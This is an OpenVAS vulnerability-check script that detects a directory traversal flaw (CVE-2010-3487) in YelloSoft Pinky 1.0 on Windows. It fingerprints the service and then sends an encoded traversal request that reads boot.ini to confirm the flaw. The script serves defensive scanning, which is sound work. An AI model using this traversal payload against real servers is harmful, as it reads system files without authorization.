###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_yellosoft_pinky_dir_trav_vuln_win.nasl 14 2013-10-27 12:33:37Z jan $
#
# YelloSoft Pinky Directory Traversal Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2010 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attacker to gain information about
  directory and file locations.
  Impact Level: System/Application.";
tag_affected = "Yellosoft pinky version 1.0 and prior on windows.";
tag_insight = "Input passed via the URL is not properly verified before being used to read
  files. This can be exploited to download arbitrary files via directory
  traversal attacks.";
tag_solution = "No solution or patch is available as of 23rd September, 2010. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.yellosoft.us/pinky";
tag_summary = "This host is running YelloSoft Pinky and is prone to Directory
  Traversal vulnerability.";

if(description)
{
  script_id(902253);
  script_version("$Revision: 14 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:33:37 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2010-09-29 09:26:02 +0200 (Wed, 29 Sep 2010)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_cve_id("CVE-2010-3487");
  script_name("YelloSoft Pinky Directory Traversal Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://osvdb.org/68141");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/41538");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/1009-exploits/pinky10-traversal.txt");
  script_xref(name : "URL" , value : "http://www.johnleitch.net/Vulnerabilities/Pinky.1.0.Directory.Traversal/42");

  script_description(desc);
  script_summary("Check through the exploit on Yellosoft pinky");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2010 SecPod");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl");
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");

ysPort = 2323;
if(!get_port_state(ysPort)){
  exit(0);
}

sndReq = http_get(item:string("/index.html"), port:ysPort);
rcvRes = http_send_recv(port:ysPort, data:sndReq);

## Confirm the aplication
if("<title>Pinky</title" >< rcvRes && ">YelloSoft<" >< rcvRes)
{
  ## Construct the attack string
  request = http_get(item:"/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C.." +
                          "/%5C../%5C../boot.ini", port:ysPort);
  response = http_send_recv(port:ysPort, data:request);

  ## Confirm the working Exploit for windows
  if(("\WINDOWS" >< response) && ("boot loader" >< response)){
      security_warning(ysPort);
  }
}
